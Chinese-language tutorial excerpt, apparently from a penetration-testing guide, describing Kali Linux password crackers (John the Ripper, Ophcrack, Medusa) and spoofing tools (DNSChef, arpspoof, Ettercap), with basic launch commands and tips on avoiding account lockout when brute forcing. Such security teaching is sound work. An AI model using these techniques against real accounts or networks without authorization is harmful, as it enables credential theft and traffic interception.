John the Ripper/John是一款[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117898&idx=3&sn=5912df226c08d392db69963d4faf1b16&chksm=bc867fa58bf1f6b3caac8a6a26efa85dcfa33c2eff0cade9b5ec60284bc90842eb46245ee7a6&scene=21#wechat_redirect)哈希的工具。目前，这款工具可以破解40 多种类型的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)哈希。它可破解常见的 DES、MD5、LM、NT、crypt、NETLM和NETNTLM型哈希。虽然破解哈希的软件有很多，但是DES和crypt型哈希的破解功能使John成为一枝独秀。

  

如需启动John程序，可在终端中使用下述指令。

  

> \# john

  

上述指令将会在屏幕上显示简单的使用说明。

  

John的[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)模式分为以下4种。

  

● 字典模式（Wordlist mode）：在这种模式下，用户只需要提供字典文件（wordlist）就可以[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118266&idx=1&sn=88de005731740043ef114ddf2a452985&chksm=bc867e558bf1f74371eae34a13fa893dc7753136395180f558d55900331e373fc053a0d2d390&scene=21#wechat_redirect)文件。字典文件是包含[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)备选值的文本文件，文件中的每行内容都将被当作一个用来进行碰撞测试的候选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。这种模式具备“字词变化”（就是某种规则）的功能，（这种规则）可自动套用在每行的备选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)中，以提高破解的概率。--wordlist=<wordlist\_ name>选项用于指定字典文件。这种字典可以是您自己制作的字典，也可以是他人制作的字典。许多网站都提供字典下载。

  

● 简易破解模式（Single crack mode）：这是John程序作者推荐的应当首先尝试的破解模式。在这种模式下，John会使用登录名、全名和用户的home文件夹名作为测试的候选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，并使用候选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)来碰撞（破解）相应账户的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，或者破解使用相同salt加密的密码哈希。就结果而言，这种模式比字典模式要快得多。

  

● 增强型破解模式（Incremental mode）：这种模式是John 各种模式里功能最强大的破解模式，它会尝试所有可能的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)组合。不过，如果用户不设置[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的测试区间，程序将会非常耗时。测试区间由[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)长度的上限和字符集的设置构成。要这种破解模式[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)，必须指定相应的破解模块。程序预设的模块有All、Alnum（字母和数字）、Alpha（字母）、Digits（数字）和 Lanman；您也可以根据实际需要自定义一个测试模块。

  

● 外部模式（External mode）：在这种模式下，用户可以指定John程序使用外部（源）程序[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)。如需使用这种模式，您首先应在配置文件里创建一个\[List.External:MODE\]的节点（section）。其中，MODE就是这种模式的一个（任意）名字，而这个节点的内容应当是C语言编写的生成候选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的各种函数。以这种模式启动程序之后，John会编译这个节点内的源代码，并使用它进行[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117794&idx=3&sn=beacc776e9269f6df4b5e6e223675d36&chksm=bc867c0d8bf1f51b2342ae032b16a870abadf4469927b93d25b838b1408fb14a76db0ff06ad0&scene=21#wechat_redirect)。

  

如果没有明确指定John的破解模式，它将会按默认顺序进行破解：首先采用简易破解模式，然后尝试字典式破解，最后进行增强式破解。

  

在使用John程序之前，您首先需要拿到包含[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)信息的哈希文件。[Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126956&idx=3&sn=237ee71fb1fc21ca3822e3d9d0202ed1&chksm=bc8598438bf21155d298f8b99f358cc572e21b627d967d5350aadc7bb838bd9d6689aca8fdb3&scene=21#wechat_redirect)一类的[操作系统](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655122728&idx=2&sn=6b263bf85d6b8bd8bf1d3744a491a40c&chksm=bc8668c78bf1e1d1a0e813fcd7b41c7bc300c2c98eb269b77f92854c62f1fe5127a0e01c5574&scene=21#wechat_redirect)，[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)哈希多数都保存在shadow文件和passwd文件里。另外，只有root级别的用户才能要读取shadow文件。

  

在获取[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)信息文件之后，您需要对这些文件做一些处理；否则John无法破解其中的哈希。好在John提供的unshadow程序可进行这种处理。

（7）Ophcrack

  

Ophcrack是一款基于彩虹表的破解工具。它可破解LM和NTLM型的[Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect)的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)哈希。这款程序有命令行版本，也有图形化界面的版本。因为它属于彩虹表破解工具，所以Ophcrack采用的破解策略同样是以空间换时间的策略。

  

[Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect) NT 和早期的 [Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect) 系统（包括 2000/XP）采用 LAN Manager（LM）保存用户密码的哈希。

  

后来，微软推出了NT LAN Manager（NTLM）哈希，以替代LM哈希。NTLM [算法](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127399&idx=3&sn=2da4a905122ffc029304547824648817&chksm=bc859a888bf2139e6cd43ee57e6e1c09f8f128c24d31df1a27f576a1eb89b2e0a518ecab1976&scene=21#wechat_redirect)可对账号进行认证，并实现了会话的完整性和保密性。[Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect) NT SP4开始，[Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect)系统开始逐步采纳更为安全的NTLM v2的算法。这种新[算法](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127399&idx=3&sn=2da4a905122ffc029304547824648817&chksm=bc859a888bf2139e6cd43ee57e6e1c09f8f128c24d31df1a27f576a1eb89b2e0a518ecab1976&scene=21#wechat_redirect)增强了服务器和用户之间的认证功能。微软已经不再推荐用户使用NTLM哈希。

**2、在线破解工具**

  

所谓在线破解，意味着这类工具在与被测主机建立连接之后才能[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)。

  

要介绍的工具可分为以下几类：

  

● 制作[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)字典；

● 搜索[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的哈希值；

● 在线[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118266&idx=1&sn=88de005731740043ef114ddf2a452985&chksm=bc867e558bf1f74371eae34a13fa893dc7753136395180f558d55900331e373fc053a0d2d390&scene=21#wechat_redirect)工具。

  

在线[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)工具会采取常规用户登录的方式，以用户名和[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)登录远程主机的网络服务。它会不断尝试各种用户名和[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，直到发现正确的账户信息为止。

  

这类工具存在暴露的风险。因为测试主机会直接连接到被测主机，所以可能会被对方发现甚至会被屏蔽。因为这些工具使用的是标准登录过程，所以在破解效率方面比离线攻击软件的效率更高。

虽然在线攻击工具速度不快，也可能触发帐户锁定机制，但是对于 SSH、Telnet 和FTP这类服务来说，在线攻击是[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118266&idx=1&sn=88de005731740043ef114ddf2a452985&chksm=bc867e558bf1f74371eae34a13fa893dc7753136395180f558d55900331e373fc053a0d2d390&scene=21#wechat_redirect)的唯一方式。在进行在线的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)攻击时，务必加倍小心；尤其是在攻击 Active Directory（AD）服务器的账户时，暴力破解可能会锁定所有的域账户。要避免发生锁定账户的情况，不仅要事先查看[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)和用户锁定策略，在测试[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)时最好还要使用同一个[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)对所有用户名进行测试（轮换用户名，而不是轮换[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)）。

（3）Medusa

  

Medusa是另外一款在线破解网络服务[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的程序。它具有速度快、并发性能强和模板化的特点。现在，它能够通过相应模板破解CVS、FTP、HTTP、IMAP、MS-SQL、MySQL、NCP（NetWare）、PcAnywhere、POP3、PostgreSQL、rexec、Rlogin、rsh、SMB、SMTP（VRFY）、SNMP、SSHv2、SVN、Telnet、VmAuthd、VNC协议，另有一个通用处理模板。

  

在实际的[渗透测试](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127519&idx=2&sn=58ad891733ee0124f14464ccaa4d5f6d&chksm=bc859a308bf21326bda32ef08c833b9e3f28967450a63f20c9a2299df8947b48ef15d86d8d45&scene=21#wechat_redirect)工作中，可同时使用这两款工具、尽可能地获取被测主机的各种信息。

**三、网络欺骗工具**

  

[网络欺骗](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655123294&idx=3&sn=2d4b308fe8ca32be8c8e5c3a9bce4b99&chksm=bc866ab18bf1e3a70404c478712bfc9f191070953aec7282b614e61166dc61e51a2c3211b644&scene=21#wechat_redirect)（network spoofing）泛指修改网络数据的各种手段。例如，伪造MAC 地址、伪造IP地址等的数据，都属于[网络欺骗](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655123294&idx=3&sn=2d4b308fe8ca32be8c8e5c3a9bce4b99&chksm=bc866ab18bf1e3a70404c478712bfc9f191070953aec7282b614e61166dc61e51a2c3211b644&scene=21#wechat_redirect)的范畴。[网络欺骗](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655123294&idx=3&sn=2d4b308fe8ca32be8c8e5c3a9bce4b99&chksm=bc866ab18bf1e3a70404c478712bfc9f191070953aec7282b614e61166dc61e51a2c3211b644&scene=21#wechat_redirect)旨在于获取网络上两个会话主机的通信数据。

  

**1、DNSChef**

  

DNSChef是一款[DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118830&idx=2&sn=e9d58b3f978d83d00ef945bbb626ca9a&chksm=bc8678018bf1f1175292bd09e647654d8c48608bef38c438db5bcf71176fe804899f846c5e2b&scene=21#wechat_redirect)代理工具。它可替[DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118830&idx=2&sn=e9d58b3f978d83d00ef945bbb626ca9a&chksm=bc8678018bf1f1175292bd09e647654d8c48608bef38c438db5bcf71176fe804899f846c5e2b&scene=21#wechat_redirect)服务器对被测主机进行[DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118830&idx=2&sn=e9d58b3f978d83d00ef945bbb626ca9a&chksm=bc8678018bf1f1175292bd09e647654d8c48608bef38c438db5bcf71176fe804899f846c5e2b&scene=21#wechat_redirect)回复，把域名解析为攻击者管控的IP，从而让攻击者的主机扮演真正的服务器的角色。DNSChef的这种功能可用来分析甚至控制客户主机的网络流量。

  

在使用DNSChef之前，您需要对被测主机进行调整，指定DNSChef的主机为被测主机的[DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116940&idx=2&sn=191df31bd5fb5eb36aa2dd2c22ba4750&chksm=bc8643638bf1ca75b1433f2eeaccff8c416be12d123721099ed95f650442b9db8ba206369ee0&scene=21#wechat_redirect)服务器。

  

● 如果被测主机安装的是[Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126956&idx=3&sn=237ee71fb1fc21ca3822e3d9d0202ed1&chksm=bc8598438bf21155d298f8b99f358cc572e21b627d967d5350aadc7bb838bd9d6689aca8fdb3&scene=21#wechat_redirect) 系统，那么您应当修改/etc/resolv.conf 文件。

● 如果被测主机安装的是 [Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect)，您可通过控制面板的网络连接选项进行相应的设置。

  

在没有权限更改被测主机 [DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118830&idx=2&sn=e9d58b3f978d83d00ef945bbb626ca9a&chksm=bc8678018bf1f1175292bd09e647654d8c48608bef38c438db5bcf71176fe804899f846c5e2b&scene=21#wechat_redirect) 服务器设置的情况下，您就需要使用其他手段（例如[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)欺骗并搭设一个伪DHCP服务器等）劫持被测主机的[DNS](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118830&idx=2&sn=e9d58b3f978d83d00ef945bbb626ca9a&chksm=bc8678018bf1f1175292bd09e647654d8c48608bef38c438db5bcf71176fe804899f846c5e2b&scene=21#wechat_redirect)请求。

  

本例涉及2台主机，一台是运行DNSChef的主机，其IP为192.168.2.21；另一台是被测（受害人的）主机，其IP是192.168.2.22。简便起见，我们用Metasploitable的虚拟机充当被测主机。

**2、arpspoof**

  

arpspoof 是一款在交换网络中辅助进行网络监听的实用工具。前面提过，在使用交换机进行数据交换的网络环境里很难进行网络监听，但arpspoof可以辅助我们完成这项任务。

  

arpspoof用于伪造网络中两台设备的[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)通信。

  

常规情况下，当主机A要和主机B（网关）进行通信的时候，主机A会广播[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)请求以获取主机B 的MAC 地址。此后，主机B 将会回应这个[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect) 请求，在[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect) Reply 数据包里声明自己的MAC地址；与此同时，主机B也会将[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)广播中主机A的MAC地址记录下来。此后，主机A和主机B才能开始通信（见图23）。

![](../Images/d59b8c1a93a45c2778ac0ab2ef7a07f3.png)

图23

如果攻击者C想要监听主机A和主机B之间的网络流量，则可以向主机A发送[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)回复，告诉它主机B使用的是主机C的MAC地址（33.33.33.33.33.33）；而后它还要通告主机B，“主机A的MAC地址是33.33.33.33.33.33”（见图24）。

![](../Images/a543c3e2af0d8837f45a775917bcfe56.png)

图24

在[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)欺骗生效之后，主机A和主机B之间的所有网络数据包都会通过主机C转发。

  

在使用arpspoof之前，需要在[Kali Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118312&idx=1&sn=15a5ce1cda46a23544ef63fac26df032&chksm=bc867e078bf1f71108a1ee28fc7ed7ffd299589427dd3dd166d3b32fe2461eb445e64f0d5590&scene=21#wechat_redirect)（运行ARPspoof）的主机上启用IP 转发功能。这就需要以root用户的身份执行下述指令。

  

> \# echo 1 > /proc/sys/net/ipv4/ip\_forward

  

要通过指令行界面启动arpspoof程序，可在终端中执行下述指令。

  

> \# arpspoof

  

上述指令将会在屏幕上显示程序的使用说明。

**3、Ettercap**

  

Ettercap是一款在[LAN](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127596&idx=3&sn=2b17fff793ef78538de02f7efa722d07&chksm=bc8595c38bf21cd534d05234f6b7fcf6ca8686efce3e93ae458e888c959af3de713dced11ad6&scene=21#wechat_redirect)中进行[中间人攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116120&idx=3&sn=2a10b8e9f9d458450df810cf658ff237&chksm=bc8646b78bf1cfa1b0eba4ee539640000b9ba9f3e16d579b5bbf61156f7bd22f9bb3c0ca042a&scene=21#wechat_redirect)的工具集。它通过[ARP攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)充当网络通信的中间人。一旦[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)协议的攻击奏效，它就能够：

  

● 修改数据连接；

● 截获FTP、HTTP、POP 和SSH1 等协议的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)；

● 通过伪造SSL 证书的手段劫持被测主机的HTTPS 会话。

  

[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)协议（地址解析协议）用来把IP地址解析为物理地址（MAC地址）。当某个网络设备需要与其他网络资源通信时，它会通过[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)广播查询目标设备的MAC地址，目标设备也会通过[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)协议的数据包回复自己的MAC地址。此后，通信双方都会将IP和MAC的对应信息保存到自己的[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)缓存中，以节省后续通信的查询时间。

  

在某台主机要进行通信时，它首先会查询对方IP地址的MAC地址。此时，攻击人员可将自己主机回复给查询MAC地址的主机，以进行中间人攻击。这种攻击叫做[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)毒化（污染）攻击和[ARP](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117609&idx=3&sn=922328fdf363dca2bc330ae0b44aa782&chksm=bc867cc68bf1f5d0968afe8925d54fab8047315be8aa5039b7bd2b97912c244e925f0229de7f&scene=21#wechat_redirect)欺骗。只有当攻击主机和被测主机处于同一网段的时候，这种攻击才会有效。

  

[Kali Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118312&idx=1&sn=15a5ce1cda46a23544ef63fac26df032&chksm=bc867e078bf1f71108a1ee28fc7ed7ffd299589427dd3dd166d3b32fe2461eb445e64f0d5590&scene=21#wechat_redirect) 提供的Ettercap 工具可以实施这种攻击。Ettercap 有三种操作模式：文本模式、仿图形（curses，以字符模拟图形界面）模式和GTK界面的图形樸式。

  

若要以文本模式启动Ettercap程序，可在终端中使用下述指令。

  

> \# ettercap -T

  

